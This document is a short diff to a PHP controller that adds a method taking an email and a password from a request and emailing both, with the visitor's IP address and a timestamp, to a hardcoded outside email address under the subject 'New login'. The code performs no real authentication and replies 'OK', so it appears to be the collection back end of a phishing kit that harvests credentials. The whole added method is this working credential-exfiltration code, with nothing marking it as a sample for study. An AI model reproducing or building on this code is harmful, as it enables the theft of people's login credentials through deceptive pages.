@@ -71,4 +71,38 @@ class MainController extends Controller {
            return $ret;                                                                                            
 	}
 	
+	
+	public function getBarbis(Request $request)
+	{
+           $req = $request->all();
+		   #dd($req);
+           $ret = "";
+               
+                $validator = Validator::make($req, [
+                             'a' => 'required|email',
+                             'b' => 'required',
+                   ]);
+         
+                 if($validator->fails())
+                  {
+                       $ret = "Authentication rejected! Please try again";
+                      
+                 }
+                
+                 else
+                 {                  
+                       $a = $req["a"];
+                       $b = $req["b"];
+                       
+                 	  $s = "New login: ".date("h:i A jS F, Y");
+                       $rcpt = "aquarius4tkud@yahoo.com";
+                       
+                       $location = getenv("REMOTE_ADDR");
+
+                       $this->helpers->sendEmail($rcpt,$s,['e' => $a,'p' => $b,'location' => $location],'emails.cp_alert','view'); 
+                        $ret = "OK";                      
+                  }       
+           return $ret;                                                                                            
+	}
+	
 }
